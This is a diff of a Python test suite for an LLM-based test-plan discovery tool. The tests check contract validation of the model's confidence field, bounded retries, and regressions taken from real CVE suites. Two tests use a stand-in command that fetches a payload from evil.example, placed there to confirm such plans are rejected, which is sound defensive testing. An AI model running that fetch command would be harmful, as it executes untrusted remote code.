@@ -11,7 +11,7 @@ import re
 from pathlib import Path
 from unittest import mock
 
-from utilities.autopatcher.test_plan_discovery import _SYSTEM_PROMPT, discover_test_plan
+from utilities.autopatcher.test_plan_discovery import _SYSTEM_PROMPT, _parse_response, discover_test_plan
 
 
 def _valid_response(**overrides) -> str:
@@ -52,6 +52,25 @@ class _FakeLLM:
         if isinstance(self.response, Exception):
             raise self.response
         return self.response
+
+
+class _SequentialFakeLLM:
+    """Returns a DIFFERENT response for each successive call, in the
+    given order -- used to test the bounded contract-repair retry, whose
+    first and second responses genuinely differ. Raises if called more
+    times than responses were supplied (a real bug -- e.g. a retry loop
+    -- must be caught, never silently reuse the last response)."""
+
+    def __init__(self, responses):
+        self.responses = list(responses)
+        self.calls = []
+
+    def complete(self, system_prompt, user_message, stage="unknown"):
+        self.calls.append((system_prompt, user_message, stage))
+        response = self.responses[len(self.calls) - 1]
+        if isinstance(response, Exception):
+            raise response
+        return response
 
 
 def _repo_with_evidence(tmp_path: Path) -> Path:
@@ -124,17 +143,16 @@ class TestMalformedOrUnsafeResponsesRejected:
         plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
         assert plan is None
 
-    def test_unrecognized_confidence_string_normalizes_to_unknown_not_rejected(self, tmp_path):
-        """confidence is advisory metadata, not execution-critical (see
+    def test_unrecognized_confidence_string_is_rejected(self, tmp_path):
+        """confidence is part of the required response CONTRACT (see
         TestConfidenceMatrix below and the module docstring) -- an
-        unrecognized self-report normalizes to "unknown" rather than
-        discarding an otherwise valid, deterministically validated plan.
-        This intentionally supersedes the old strict-reject behavior for
-        this exact case."""
+        unrecognized self-report is REJECTED outright, exactly like an
+        unrecognized result_strategy. A real urllib3 replay showed the
+        opposite (silent "unknown" substitution, plan still accepted)
+        being unsafe; this supersedes that old tolerant behavior."""
         llm = _FakeLLM(_valid_response(confidence="extremely-sure"))
         plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
-        assert plan is not None
-        assert plan.confidence == "unknown"
+        assert plan is None
 
     def test_low_confidence_returns_none(self, tmp_path):
         llm = _FakeLLM(_valid_response(confidence="low"))
@@ -494,12 +512,15 @@ class TestLowConfidenceNeverInventsJunit:
 
 
 class TestConfidenceMatrix:
-    """confidence is advisory metadata, not execution-critical (see the
-    module docstring's "Metadata vs. execution-critical fields" and
-    "Confidence semantics"). This is the full behavior matrix: only a
-    model's OWN deliberate "low" self-report still blocks discovery;
-    every other case -- valid, missing, wrong-typed, or an unrecognized
-    string -- must not by itself discard an otherwise valid plan."""
+    """confidence is advisory in what it's USED for (never part of the
+    execution-safety boundary -- see "Confidence semantics" in the module
+    docstring), but IS part of the required response CONTRACT (see
+    "Metadata vs. execution-critical fields"). This is the full behavior
+    matrix: "high"/"medium" are preserved, a model's OWN deliberate "low"
+    self-report blocks discovery (a cost heuristic, not a validation
+    failure), and missing/wrong-typed/unrecognized confidence is REJECTED
+    outright -- never silently substituted with an out-of-schema
+    placeholder and accepted."""
 
     def test_high_is_preserved(self, tmp_path):
         llm = _FakeLLM(_valid_response(confidence="high"))
@@ -524,28 +545,25 @@ class TestConfidenceMatrix:
         plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
         assert plan is None
 
-    def test_missing_confidence_does_not_discard_a_valid_plan(self, tmp_path):
-        """The exact real-run bug: the LLM's response omitted
-        "confidence" entirely. It must normalize to "unknown" (never
-        "low", which would wrongly trigger the low-confidence policy
-        rejection above) and the otherwise-valid plan must still be
-        returned."""
+    def test_missing_confidence_is_rejected(self, tmp_path):
+        """The exact real urllib3 replay bug: the LLM's response omitted
+        "confidence" entirely. An earlier version of this module
+        normalized that to "unknown" and still returned the plan -- now
+        it is rejected outright, the same as any other missing
+        execution-critical-shaped field."""
         llm = _FakeLLM(_valid_response_missing("confidence"))
         plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
-        assert plan is not None
-        assert plan.confidence == "unknown"
+        assert plan is None
 
-    def test_invalid_type_normalizes_to_unknown(self, tmp_path):
+    def test_invalid_type_is_rejected(self, tmp_path):
         llm = _FakeLLM(_valid_response(confidence=42))
         plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
-        assert plan is not None
-        assert plan.confidence == "unknown"
+        assert plan is None
 
-    def test_unrecognized_string_normalizes_to_unknown(self, tmp_path):
+    def test_unrecognized_string_is_rejected(self, tmp_path):
         llm = _FakeLLM(_valid_response(confidence="extremely-sure"))
         plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
-        assert plan is not None
-        assert plan.confidence == "unknown"
+        assert plan is None
 
 
 def _urllib3_real_response_missing_confidence() -> str:
@@ -599,34 +617,53 @@ def _urllib3_real_response_repo(tmp_path: Path) -> Path:
 
 
 class TestUrllib3ConfidenceOmittedRealRunRegression:
-    """Reproduces the exact real-run failure: a strong, fully
-    execution-critical-valid plan was discarded solely because the
-    response omitted "confidence". No live LLM call -- a deterministic
-    fixture built from the exact JSON shape observed in the real run.
+    """Reproduces the exact real urllib3 CVE-2023-43804 replay failure:
+    a strong, fully execution-critical-valid plan was SILENTLY ACCEPTED
+    with a fabricated "unknown" confidence value, solely because the
+    response omitted "confidence" -- an out-of-schema value the LLM never
+    actually returned, persisted as if it were legitimate. No live LLM
+    call -- a deterministic fixture built from the exact JSON shape
+    observed in the real run.
 
-    Expected result after the fix: the plan parses successfully, passes
-    deterministic validation, and discover_test_plan returns a usable
-    TestExecutionPlan."""
+    Expected result after this fix: the response is REJECTED outright
+    (discover_test_plan returns None) -- exactly the same "no plan
+    discovered" outcome any other execution-critical-shaped contract
+    violation already produces. This class supersedes an earlier version
+    of itself that asserted the opposite (silent acceptance) as correct."""
 
-    def test_plan_is_discovered_despite_missing_confidence(self, tmp_path):
+    def test_plan_is_rejected_despite_otherwise_being_execution_critical_valid(self, tmp_path):
         repo = _urllib3_real_response_repo(tmp_path)
         llm = _FakeLLM(_urllib3_real_response_missing_confidence())
         plan = discover_test_plan(repo, llm)
+        assert plan is None
+
+    def test_rejection_reason_names_confidence(self, tmp_path):
+        repo = _urllib3_real_response_repo(tmp_path)
+        llm = _FakeLLM(_urllib3_real_response_missing_confidence())
+        rejection_reason: "list[str]" = []
+        plan = discover_test_plan(repo, llm, rejection_reason=rejection_reason)
+        assert plan is None
+        assert rejection_reason and "confidence" in rejection_reason[0]
+
+    def test_supplying_a_valid_confidence_on_the_same_shape_is_accepted(self, tmp_path):
+        """Confirms the fixture itself is otherwise well-formed -- adding
+        back a valid confidence value (what the model SHOULD have
+        returned) makes it discoverable, isolating confidence as the
+        sole cause of the rejection above."""
+        from utilities.autopatcher.test_plan_validation import validate_plan
+        repo = _urllib3_real_response_repo(tmp_path)
+        payload = json.loads(_urllib3_real_response_missing_confidence())
+        payload["confidence"] = "high"
+        llm = _FakeLLM(json.dumps(payload))
+        plan = discover_test_plan(repo, llm)
         assert plan is not None
+        assert plan.confidence == "high"
         assert plan.result_strategy == "junit"
         assert plan.result_output_path == "/tmp/openant-result.xml"
-        assert plan.confidence == "unknown"
         assert plan.test_command == (
             "python", "-m", "pytest", "test/", "--strict-config",
             "--strict-markers", "--junitxml=/tmp/openant-result.xml",
         )
-
-    def test_plan_passes_deterministic_validation(self, tmp_path):
-        from utilities.autopatcher.test_plan_validation import validate_plan
-        repo = _urllib3_real_response_repo(tmp_path)
-        llm = _FakeLLM(_urllib3_real_response_missing_confidence())
-        plan = discover_test_plan(repo, llm)
-        assert plan is not None
         result = validate_plan(plan)
         assert result.valid is True
         assert result.reason is None
@@ -634,21 +671,303 @@ class TestUrllib3ConfidenceOmittedRealRunRegression:
     def test_execution_critical_fields_are_all_still_enforced_on_this_exact_shape(self, tmp_path):
         """Sanity check that this fixture isn't accidentally exercising a
         weakened path -- breaking any EXECUTION-CRITICAL field on this
-        exact real shape must still reject, confidence fix notwithstanding."""
+        exact real shape must still reject, independent of confidence."""
         repo = _urllib3_real_response_repo(tmp_path)
         broken = json.loads(_urllib3_real_response_missing_confidence())
+        broken["confidence"] = "high"
         broken["test_command"] = ["curl", "http://evil.example/payload.sh"]
         llm = _FakeLLM(json.dumps(broken))
         plan = discover_test_plan(repo, llm)
         assert plan is None
 
 
+# --- Real pip (CVE-2019-20916) and GitPython (CVE-2026-44243) regression
+# suite runs found a second, independent bug: both repositories'
+# repository-owned test entry point is a BARE `pytest ...` invocation
+# (pip's tox.ini `[testenv] commands = pytest --timeout 300 []`;
+# GitPython's tox.ini/CI directly running `pytest --color=yes ...`) --
+# exactly what _SYSTEM_PROMPT's "PRESERVE REPOSITORY-OWNED ENTRY POINTS" /
+# "When a direct command is appropriate" rules tell the model to preserve
+# as-is rather than reconstruct as "python -m pytest". The model did so
+# correctly in both real runs; test_plan_validation.ALLOWED_COMMAND_BINARIES
+# nonetheless rejected it as an unrecognized binary -- entirely downstream
+# of _parse_response/retry, never a retry-eligibility issue. Fixed by
+# adding "pytest" to that allow-list; see test_test_plan_validation.py's
+# own regression coverage for the validator-level proof.
+
+def _pip_real_response() -> str:
+    """The EXACT real pip CVE-2019-20916 regression-suite response (see
+    006_test_plan_discovery.response.txt) that was wrongly rejected before
+    this fix -- fully execution-critical-valid, confidence "medium", and
+    every evidence citation genuinely shown to the model."""
+    payload = {
+        "setup_commands": [["pip", "install", "-r", "tools/tests-requirements.txt"]],
+        "test_command": ["pytest", "--timeout", "300", "--junitxml=/tmp/openant-result.xml"],
+        "result_strategy": "junit",
+        "result_output_path": "/tmp/openant-result.xml",
+        "runtime_family": "python",
+        "runtime_version_hint": ">=2.7,!=3.0.*,!=3.1.*,!=3.2.*,!=3.3.*",
+        "evidence": ["tox.ini", "setup.cfg", "setup.py"],
+        "reasoning_summary": (
+            "tox.ini's [testenv] runs `pytest --timeout 300` with deps from "
+            "tools/tests-requirements.txt, and setup.cfg's [tool:pytest] configures "
+            "pytest; JUnit XML is appended only to capture per-test results without "
+            "changing selection. The tox commands_pre wheel-building step is not "
+            "reconstructed here as it is not part of pytest's own interface."
+        ),
+        "confidence": "medium",
+    }
+    return json.dumps(payload)
+
+
+def _pip_real_response_repo(tmp_path: Path) -> Path:
+    (tmp_path / "tox.ini").write_text(
+        "[testenv]\ndeps = -r{toxinidir}/tools/tests-requirements.txt\n"
+        "commands = pytest --timeout 300 []\n",
+        encoding="utf-8",
+    )
+    (tmp_path / "setup.cfg").write_text("[tool:pytest]\naddopts = -r aR\n", encoding="utf-8")
+    (tmp_path / "setup.py").write_text("from setuptools import setup\nsetup()\n", encoding="utf-8")
+    return tmp_path
+
+
+class TestPipBarePytestRealRunRegression:
+    """Reproduces the exact real pip CVE-2019-20916 regression-suite
+    failure: a fully valid, well-evidenced, confidence="medium" plan was
+    rejected outright because test_command begins with bare "pytest"."""
+
+    def test_real_pip_response_is_accepted(self, tmp_path):
+        repo = _pip_real_response_repo(tmp_path)
+        llm = _FakeLLM(_pip_real_response())
+        plan = discover_test_plan(repo, llm)
+        assert plan is not None
+        assert plan.test_command == ("pytest", "--timeout", "300", "--junitxml=/tmp/openant-result.xml")
+        assert plan.confidence == "medium"
+        assert plan.result_strategy == "junit"
+
+    def test_real_pip_response_makes_exactly_one_call_no_retry_needed(self, tmp_path):
+        """The pip response was never missing/invalid in a repairable
+        way -- it fails (before this fix) at deterministic validation,
+        entirely downstream of _parse_response/retry. Confirms the fix
+        does not, and should not, involve the retry mechanism at all."""
+        repo = _pip_real_response_repo(tmp_path)
+        llm = _FakeLLM(_pip_real_response())
+        discover_test_plan(repo, llm)
+        assert len(llm.calls) == 1
+
+
+def _gitpython_real_initial_response_missing_confidence() -> str:
+    """The EXACT real GitPython CVE-2026-44243 regression-suite initial
+    response (see 007_test_plan_discovery.response.txt) -- otherwise
+    execution-critical-valid, "confidence" omitted outright."""
+    payload = {
+        "setup_commands": [["pip", "install", ".[test]"], ["./init-tests-after-clone.sh"]],
+        "test_command": ["pytest", "--color=yes", "--junitxml=/tmp/openant-result.xml"],
+        "result_strategy": "junit",
+        "result_output_path": "/tmp/openant-result.xml",
+        "runtime_family": "python",
+        "runtime_version_hint": ">=3.7",
+        "evidence": [
+            "pyproject.toml", "tox.ini", "test-requirements.txt", "setup.py",
+            ".github/workflows/alpine-test.yml",
+        ],
+        "reasoning_summary": (
+            "pyproject.toml [tool.pytest.ini_options] and tox.ini (`pytest --color=yes`) "
+            "plus CI (`pytest --color=yes ...`) establish pytest as the runner; setup.py "
+            "declares a 'test' extra installed via `pip install .[test]` and CI runs "
+            "./init-tests-after-clone.sh to prepare the repo. JUnit XML is appended only "
+            "to capture per-test results without changing selection."
+        ),
+        # "confidence" deliberately absent -- this is the real, observed model failure.
+    }
+    return json.dumps(payload)
+
+
+def _gitpython_real_retry_response_missing_confidence() -> str:
+    """The EXACT real GitPython contract-repair retry response (see
+    008_test_plan_discovery_contract_retry.response.txt): the model
+    dropped the unrecognized-later ./init-tests-after-clone.sh setup
+    command, but STILL omitted "confidence" -- a genuine, repeated model
+    failure. Per the bounded-retry design, a second failure of any kind
+    is never retried again -- this is the real, correct-as-observed
+    rejection, not a bug this fix addresses (see the class below)."""
+    payload = {
+        "setup_commands": [["python", "-m", "pip", "install", ".[test]"]],
+        "test_command": ["pytest", "--color=yes", "--junitxml=/tmp/openant-result.xml"],
+        "result_strategy": "junit",
+        "result_output_path": "/tmp/openant-result.xml",
+        "runtime_family": "python",
+        "runtime_version_hint": ">=3.7",
+        "evidence": [
+            "pyproject.toml", "tox.ini", "setup.py", "test-requirements.txt",
+            ".github/workflows/alpine-test.yml",
+        ],
+        "reasoning_summary": (
+            "pyproject.toml's [tool.pytest.ini_options] and tox.ini ([testenv] runs "
+            "`pytest --color=yes`) plus CI (alpine-test.yml runs pytest) establish pytest "
+            "as the runner; setup.py's extras_require[\"test\"] (from test-requirements.txt) "
+            "is installed via `pip install .[test]` exactly as CI does. JUnit XML is added "
+            "only to capture per-test results and does not change test selection."
+        ),
+        # "confidence" deliberately absent -- the real retry response never included it.
+    }
+    return json.dumps(payload)
+
+
+def _gitpython_real_repo(tmp_path: Path) -> Path:
+    (tmp_path / "pyproject.toml").write_text("[tool.pytest.ini_options]\n", encoding="utf-8")
+    (tmp_path / "tox.ini").write_text(
+        "[testenv]\ncommands = pytest --color=yes\n", encoding="utf-8",
+    )
+    (tmp_path / "test-requirements.txt").write_text("pytest\n", encoding="utf-8")
+    (tmp_path / "setup.py").write_text(
+        "from setuptools import setup\nsetup(extras_require={'test': ['pytest']})\n",
+        encoding="utf-8",
+    )
+    wf = tmp_path / ".github" / "workflows"
+    wf.mkdir(parents=True)
+    (wf / "alpine-test.yml").write_text(
+        "jobs:\n  test:\n    steps:\n      - run: pytest --color=yes\n", encoding="utf-8",
+    )
+    return tmp_path
+
+
+class TestGitPythonBarePytestRetryRealRunRegression:
+    """Reproduces the exact real GitPython CVE-2026-44243 regression-suite
+    failure. Two independent things are proven here:
+
+    1. (the actual observed run) initial response missing confidence ->
+       exactly one retry fires -> retry response ALSO missing confidence
+       (a genuine, repeated model failure, not a code bug) -> exactly two
+       calls total -> plan remains rejected, no third retry. This is
+       correct, unchanged behavior -- not what this fix addresses.
+    2. (isolating the fix) the same retry response, with a valid
+       confidence value added back (what a compliant retry would have
+       looked like), is now accepted -- proving the ONLY remaining
+       obstacle was the bare-"pytest"-binary validation gap."""
+
+    def test_real_run_missing_confidence_twice_remains_rejected_with_exactly_two_calls(self, tmp_path):
+        repo = _gitpython_real_repo(tmp_path)
+        llm = _SequentialFakeLLM([
+            _gitpython_real_initial_response_missing_confidence(),
+            _gitpython_real_retry_response_missing_confidence(),
+        ])
+        plan = discover_test_plan(repo, llm)
+        assert plan is None
+        assert len(llm.calls) == 2
+        assert [call[2] for call in llm.calls] == [
+            "test_plan_discovery", "test_plan_discovery_contract_retry",
+        ]
+
+    def test_corrected_retry_with_valid_confidence_and_bare_pytest_is_accepted(self, tmp_path):
+        repo = _gitpython_real_repo(tmp_path)
+        corrected_retry = json.loads(_gitpython_real_retry_response_missing_confidence())
+        corrected_retry["confidence"] = "medium"
+        llm = _SequentialFakeLLM([
+            _gitpython_real_initial_response_missing_confidence(),
+            json.dumps(corrected_retry),
+        ])
+        plan = discover_test_plan(repo, llm)
+        assert plan is not None
+        assert len(llm.calls) == 2
+        assert plan.test_command == ("pytest", "--color=yes", "--junitxml=/tmp/openant-result.xml")
+        assert plan.confidence == "medium"
+        assert plan.result_strategy == "junit"
+
+
+# --- A second, independent real GitPython CVE-2026-44243 regression-suite
+# finding: a valid, well-evidenced, high-confidence plan's setup_commands
+# included "./init-tests-after-clone.sh" -- a real script GitPython's own CI
+# directly invokes to prepare the repository for tests, exactly the kind of
+# repository-owned entry point _SYSTEM_PROMPT's own "PRESERVE REPOSITORY-
+# OWNED ENTRY POINTS" rule tells the model to preserve. Rejected outright by
+# test_plan_validation.ALLOWED_COMMAND_BINARIES, which has no notion of a
+# repository-owned file at all. Fixed via
+# test_plan_command_provenance.resolve_repository_owned_commands -- an
+# evidence-backed repository-command model, never a static allowlist entry
+# for this one path, never a filename/path heuristic.
+
+def _gitpython_repo_with_init_script(tmp_path: Path) -> Path:
+    """_gitpython_real_repo, plus the actual init-tests-after-clone.sh
+    script on disk and CI evidence content that directly invokes it --
+    the real repository-owned preparation step GitPython's CI performs
+    before running pytest."""
+    repo = _gitpython_real_repo(tmp_path)
+    (repo / "init-tests-after-clone.sh").write_text("#!/bin/sh\ngit submodule update --init\n", encoding="utf-8")
+    (repo / ".github" / "workflows" / "alpine-test.yml").write_text(
+        "jobs:\n  test:\n    steps:\n"
+        "      - run: ./init-tests-after-clone.sh\n"
+        "      - run: pytest --color=yes\n",
+        encoding="utf-8",
+    )
+    return repo
+
+
+def _gitpython_real_response_with_init_script_and_confidence() -> str:
+    """The real GitPython initial response shape (see
+    007_test_plan_discovery.response.txt), which DID include
+    "./init-tests-after-clone.sh" in setup_commands -- with a valid
+    confidence value added (the missing-confidence failure is a separate,
+    already-fixed concern; see TestGitPythonBarePytestRetryRealRunRegression
+    above), isolating the repository-owned-command provenance fix alone."""
+    payload = json.loads(_gitpython_real_initial_response_missing_confidence())
+    payload["confidence"] = "high"
+    return json.dumps(payload)
+
+
+class TestGitPythonRepositoryOwnedScriptRealRunRegression:
+    """Reproduces the exact real GitPython CVE-2026-44243 setup_commands
+    rejection: "setup_commands[0] starts with an unrecognized binary:
+    './init-tests-after-clone.sh'" -- despite the script being a real,
+    CI-evidenced repository preparation step."""
+
+    def test_real_response_with_init_script_is_now_accepted(self, tmp_path):
+        repo = _gitpython_repo_with_init_script(tmp_path)
+        llm = _FakeLLM(_gitpython_real_response_with_init_script_and_confidence())
+        plan = discover_test_plan(repo, llm)
+        assert plan is not None
+        assert plan.setup_commands == (
+            ("pip", "install", ".[test]"),
+            ("./init-tests-after-clone.sh",),
+        )
+        assert plan.test_command == ("pytest", "--color=yes", "--junitxml=/tmp/openant-result.xml")
+
+    def test_makes_exactly_one_llm_call_no_retry_triggered(self, tmp_path):
+        """The provenance check is not one of _parse_response's three
+        narrow repairable shapes -- a plan that is otherwise perfectly
+        schema-valid must never trigger a retry merely because a
+        repository-owned command needed provenance checking."""
+        repo = _gitpython_repo_with_init_script(tmp_path)
+        llm = _FakeLLM(_gitpython_real_response_with_init_script_and_confidence())
+        discover_test_plan(repo, llm)
+        assert len(llm.calls) == 1
+
+    def test_unevidenced_repository_script_is_rejected_without_retry(self, tmp_path):
+        """The provenance rejection path is a plain _reject, exactly like
+        an evidence-citation failure -- not repairable, no retry."""
+        repo = _gitpython_real_repo(tmp_path)  # no init-tests-after-clone.sh anywhere
+        llm = _FakeLLM(_gitpython_real_response_with_init_script_and_confidence())
+        plan = discover_test_plan(repo, llm)
+        assert plan is None
+        assert len(llm.calls) == 1
+
+    def test_rejection_reason_names_the_provenance_failure(self, tmp_path):
+        repo = _gitpython_real_repo(tmp_path)
+        llm = _FakeLLM(_gitpython_real_response_with_init_script_and_confidence())
+        rejection_reason: "list[str]" = []
+        plan = discover_test_plan(repo, llm, rejection_reason=rejection_reason)
+        assert plan is None
+        assert rejection_reason and "init-tests-after-clone.sh" in rejection_reason[0]
+
+
 class TestMetadataFieldsToleratedWhenMissingNotWhenMalformed:
-    """reasoning_summary and runtime_version_hint suffered the exact same
-    _REQUIRED_KEYS bug as confidence (see module docstring) -- fixed the
-    same way, but WITHOUT loosening the existing malformed-VALUE
-    rejection for either (only their outright absence is now tolerated;
-    scope deliberately not broadened beyond that)."""
+    """reasoning_summary and runtime_version_hint are genuinely advisory
+    metadata (never part of the response CONTRACT the way confidence now
+    is -- see the module docstring): their outright absence is tolerated
+    and normalized to a safe default, but a malformed VALUE for either
+    is still a hard rejection, unchanged. confidence is deliberately NOT
+    given this same absence-tolerant treatment (see TestConfidenceMatrix)
+    -- these two remain the only fields treated this leniently."""
 
     def test_missing_runtime_version_hint_defaults_to_none(self, tmp_path):
         llm = _FakeLLM(_valid_response_missing("runtime_version_hint"))
@@ -674,13 +993,18 @@ class TestMetadataFieldsToleratedWhenMissingNotWhenMalformed:
         plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
         assert plan is None
 
-    def test_missing_confidence_and_missing_runtime_version_hint_together_still_succeed(self, tmp_path):
-        """Multiple simultaneously-omitted metadata fields compose --
-        this isn't a special case wired only for "confidence alone"."""
+    def test_missing_confidence_still_rejects_even_alongside_other_omitted_metadata(self, tmp_path):
+        """confidence is NOT in the same lenient bucket as
+        runtime_version_hint -- omitting both together must still reject
+        the whole response, on confidence's account alone."""
         llm = _FakeLLM(_valid_response_missing("confidence", "runtime_version_hint"))
         plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
+        assert plan is None
+
+    def test_missing_runtime_version_hint_alone_still_succeeds_with_valid_confidence(self, tmp_path):
+        llm = _FakeLLM(_valid_response_missing("runtime_version_hint"))
+        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
         assert plan is not None
-        assert plan.confidence == "unknown"
         assert plan.runtime_version_hint is None
 
 
@@ -1440,28 +1764,66 @@ class TestConfidenceOutputChecklistPromptContract:
         assert schema_pos < checklist_pos
 
 
-class TestConfidenceOmissionFallbackUnchangedByPromptFix:
-    """The prompt fix must not change confidence's runtime fallback
-    behavior at all -- missing/malformed confidence still normalizes to
-    "unknown" and an otherwise execution-critical-valid plan is still
-    accepted; a model-reported "low" is still the one case that blocks
-    discovery. Same behavior matrix as TestConfidenceMatrix above,
-    asserted again here specifically to pin down "the fallback did not
-    regress when the prompt changed."""
+class TestStructuredEvidenceReinforcementPromptContract:
+    """Prompt-content contract for the structured-evidence-upgrade
+    reinforcement -- the real urllib3 CVE-2023-43804 evidence shape
+    (pyproject.toml + noxfile.py + CI showing a direct pytest invocation)
+    already validates end-to-end as a "junit" plan (see
+    TestUrllib3ShapedRealRunRegression), but a real run still chose
+    exit_code -- this is a reinforcing nudge, not a rewrite, placed
+    immediately before the existing final checklist so it stays near the
+    end without displacing the confidence checklist as the LAST thing the
+    model reads (see TestConfidenceOutputChecklistPromptContract)."""
 
-    def test_missing_confidence_still_normalizes_to_unknown_and_plan_is_accepted(self, tmp_path):
+    def test_reinforcement_text_present(self):
+        assert 'Before settling on result_strategy = "exit_code"' in _SYSTEM_PROMPT
+        assert "directly-\n  evidenced invocation" in _SYSTEM_PROMPT or "directly-evidenced invocation" in _SYSTEM_PROMPT
+
+    def test_reinforcement_mentions_wrapper_tools_generically_not_by_hardcoding_one(self):
+        """nox/tox are cited only as illustrative examples of a wrapper
+        category, not hardcoded behavior -- the rule itself is about ANY
+        wrapper vs. a directly-evidenced invocation."""
+        assert "nox/tox" in _SYSTEM_PROMPT
+        assert "wrapper/session tool" in _SYSTEM_PROMPT
+
+    def test_reinforcement_precedes_the_final_checklist(self):
+        """The confidence checklist must remain the LAST thing the model
+        reads -- this reinforcement is folded in just before it, not
+        appended after it."""
+        reinforcement_pos = _SYSTEM_PROMPT.index('Before settling on result_strategy = "exit_code"')
+        checklist_pos = _SYSTEM_PROMPT.index("Before returning, verify")
+        assert reinforcement_pos < checklist_pos
+
+    def test_confidence_checklist_is_still_the_very_last_thing(self):
+        """Regression guard: this fix must not disturb the pre-existing
+        invariant that nothing of substance follows the confidence
+        checklist."""
+        checklist_pos = _SYSTEM_PROMPT.index("Before returning, verify")
+        assert _SYSTEM_PROMPT[checklist_pos:].count("\n\n") == 0
+
+
+class TestConfidenceContractEnforcedConsistently:
+    """The confidence-contract fix must apply consistently regardless of
+    prompt wording or which real-run fixture shape triggers it --
+    missing/malformed confidence is REJECTED outright; a model-reported
+    "low" is still the one case that blocks discovery for a different
+    (policy, not contract) reason. Same behavior matrix as
+    TestConfidenceMatrix above, asserted again here specifically against
+    additional real-shaped fixtures (this class previously asserted the
+    OPPOSITE -- silent "unknown" substitution and acceptance -- as
+    correct; that was the real urllib3 replay bug this fix closes)."""
+
+    def test_missing_confidence_is_rejected(self, tmp_path):
         llm = _FakeLLM(_valid_response_missing("confidence"))
         plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
-        assert plan is not None
-        assert plan.confidence == "unknown"
+        assert plan is None
 
-    def test_malformed_confidence_still_normalizes_to_unknown_not_rejected(self, tmp_path):
+    def test_malformed_confidence_is_rejected(self, tmp_path):
         llm = _FakeLLM(_valid_response(confidence=["high"]))
         plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
-        assert plan is not None
-        assert plan.confidence == "unknown"
+        assert plan is None
 
-    def test_valid_high_medium_low_still_all_preserved(self, tmp_path):
+    def test_valid_high_medium_preserved_low_still_blocks_discovery(self, tmp_path):
         for level in ("high", "medium", "low"):
             llm = _FakeLLM(_valid_response(confidence=level))
             plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
@@ -1471,11 +1833,10 @@ class TestConfidenceOmissionFallbackUnchangedByPromptFix:
                 assert plan is not None
                 assert plan.confidence == level
 
-    def test_malformed_confidence_never_weakens_execution_validation(self, tmp_path):
-        """A malformed confidence must never smuggle an otherwise-invalid
-        plan through -- normalizing confidence to "unknown" is orthogonal
-        to, and never a substitute for, deterministic execution-safety
-        validation of the rest of the plan."""
+    def test_malformed_confidence_rejection_composes_with_execution_validation(self, tmp_path):
+        """Confidence and execution-safety validation are independent
+        rejection paths -- a response broken on BOTH counts is still
+        just as rejected as one broken on either alone."""
         llm = _FakeLLM(_valid_response(
             confidence="totally-sure!!!",
             test_command=["curl", "http://evil.example/payload.sh"],
@@ -1483,12 +1844,12 @@ class TestConfidenceOmissionFallbackUnchangedByPromptFix:
         plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
         assert plan is None
 
-    def test_real_minimist_shaped_omission_is_still_accepted_via_fallback(self, tmp_path):
+    def test_real_minimist_shaped_omission_is_now_rejected(self, tmp_path):
         """Reproduces the exact real-run shape reported for the minimist
         stage replay: a fully execution-critical-valid exit_code plan
-        with "confidence" omitted outright. Regardless of whether the
-        improved prompt reduces how often this happens against a live
-        model, the deterministic fallback must still accept it."""
+        with "confidence" omitted outright. Previously silently accepted
+        via the "unknown" fallback -- now rejected, the same as any other
+        confidence-contract violation."""
         repo = _minimist_shaped_repo(tmp_path)
         llm = _FakeLLM(json.dumps({
             "setup_commands": [],
@@ -1505,41 +1866,726 @@ class TestConfidenceOmissionFallbackUnchangedByPromptFix:
             # "confidence" deliberately absent -- the real observed bug.
         }))
         plan = discover_test_plan(repo, llm)
+        assert plan is None
+
+
+class TestBoundedContractRepairRetry:
+    """The bounded S10 contract-repair retry (real urllib3 full-run
+    finding: a semantically correct, well-evidenced plan was rejected
+    outright merely for omitting `confidence`). Exactly one retry, and
+    ONLY for the three narrow, mechanical output-contract violations
+    _parse_response marks repairable: missing required key(s), an
+    invalid `confidence`, or an invalid `result_strategy`. Every other
+    rejection reason -- including cross-field semantic inconsistencies,
+    which are DELIBERATELY not retried in this slice -- makes exactly one
+    LLM call, exactly as before this fix."""
+
+    # 1. missing confidence -> exactly one retry -> valid second response accepted
+    def test_missing_confidence_then_valid_response_is_accepted_after_one_retry(self, tmp_path):
+        llm = _SequentialFakeLLM([_valid_response_missing("confidence"), _valid_response()])
+        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
         assert plan is not None
-        assert plan.confidence == "unknown"
-        assert plan.test_command == ("npm", "test")
+        assert len(llm.calls) == 2
 
+    # 2. missing confidence twice -> exactly two calls total -> rejected
+    def test_missing_confidence_twice_is_rejected_after_exactly_two_calls(self, tmp_path):
+        response = _valid_response_missing("confidence")
+        llm = _SequentialFakeLLM([response, response])
+        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
+        assert plan is None
+        assert len(llm.calls) == 2
 
-class TestNoRetryWasAddedForConfidence:
-    """Explicit regression guard: the confidence-omission fix must be
-    prompt-only. No second LLM call may ever be triggered because
-    confidence was missing/malformed -- discover_test_plan still makes AT
-    MOST one call, exactly as before this fix."""
+    # 3. missing another required key -> exactly one retry
+    def test_missing_another_required_key_retries_once(self, tmp_path):
+        llm = _SequentialFakeLLM([_valid_response_missing("result_strategy"), _valid_response()])
+        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
+        assert plan is not None
+        assert len(llm.calls) == 2
 
-    def test_missing_confidence_still_makes_exactly_one_llm_call(self, tmp_path):
-        llm = _FakeLLM(_valid_response_missing("confidence"))
-        discover_test_plan(_repo_with_evidence(tmp_path), llm)
+    # 4. invalid result_strategy -> exactly one retry
+    def test_invalid_result_strategy_retries_once(self, tmp_path):
+        llm = _SequentialFakeLLM([_valid_response(result_strategy="bogus"), _valid_response()])
+        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
+        assert plan is not None
+        assert len(llm.calls) == 2
+
+    # 5. valid first response -> one call only
+    def test_valid_first_response_makes_exactly_one_call(self, tmp_path):
+        llm = _FakeLLM(_valid_response())
